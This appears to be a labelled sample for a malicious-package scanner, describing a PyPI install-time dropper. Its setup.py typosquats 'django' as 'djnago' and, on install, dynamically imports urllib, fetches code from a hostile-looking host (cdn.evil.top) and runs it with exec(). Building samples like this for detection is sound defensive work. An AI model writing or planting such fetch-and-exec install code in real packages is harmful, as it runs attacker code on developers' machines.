name: pypi-setup-import-network-dropper
note: setup.py uses __import__ to reach urllib at runtime, then exec()s a fetched body — the dynamic-import + network form of the install-time dropper. Package name typosquats `django`.

sourceFiles.setup.py:
from setuptools import setup

_m = __import__("urllib.request", fromlist=["urlopen"])
exec(_m.urlopen("http://cdn.evil.top/x").read())

setup(name="djnago", version="4.2.0", py_modules=["djnago"])
